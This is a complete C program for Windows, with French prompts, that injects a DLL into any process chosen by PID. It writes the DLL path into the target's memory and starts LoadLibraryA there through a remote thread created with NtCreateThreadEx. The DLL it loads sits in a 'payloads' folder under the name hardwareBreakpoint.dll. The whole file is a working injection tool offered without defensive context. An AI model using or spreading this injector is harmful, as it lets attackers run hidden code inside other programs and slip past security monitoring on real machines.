#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE             ThreadHandle,
    ACCESS_MASK         DesiredAccess,
    PVOID               ObjectAttributes,
    HANDLE              ProcessHandle,
    PVOID               StartRoutine,
    PVOID               Argument,
    ULONG               CreateFlags,
    SIZE_T              ZeroBits,
    SIZE_T              StackSize,
    SIZE_T              MaximumStackSize,
    PVOID               AttributeList
    );

int main(int argc, char* argv[]) {

    while(1==1){
        // Asking for PID
        DWORD pid;
        printf("[?] PID cible : ");
        scanf("%lu", &pid);

        char* dllPath = "C:\\VM\\shared_folder\\payloads\\main\\x64\\Release\\hardwareBreakpoint.dll";
        SIZE_T dllPathLen = strlen(dllPath) + 1;


	    printf("[+] Injecting DLL into PID %lu\n", pid);
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            printf("[-] OpenProcess failed: %lu\n", GetLastError());
            return 1;
        }

        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathLen,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) {
            printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
            CloseHandle(hProcess);
            return 1;
        }

        if (!WriteProcessMemory(hProcess, remoteMem, dllPath, dllPathLen, NULL)) {
            printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
            CloseHandle(hProcess);
            return 1;
        }

        LPVOID loadLib = (LPVOID)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA");


        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
        if (!NtCreateThreadEx) {
            printf("[-] NtCreateThreadEx non trouvé\n");
            CloseHandle(hProcess);
            return 1;
        }

        HANDLE hThread = NULL;
        NTSTATUS status = NtCreateThreadEx(
            &hThread,
            GENERIC_ALL,
            NULL,
            hProcess,
            loadLib,
            remoteMem,
            0,
            0, 0, 0, NULL
        );

        if (!hThread || status != 0) {
            printf("[-] NtCreateThreadEx failed: 0x%lX\n", status);
            CloseHandle(hProcess);
            return 1;
        }

        WaitForSingleObject(hThread, INFINITE);
        printf("[+] DLL injectee dans PID %lu\n", pid);

        CloseHandle(hThread);
        CloseHandle(hProcess);
    }
    return 0;
}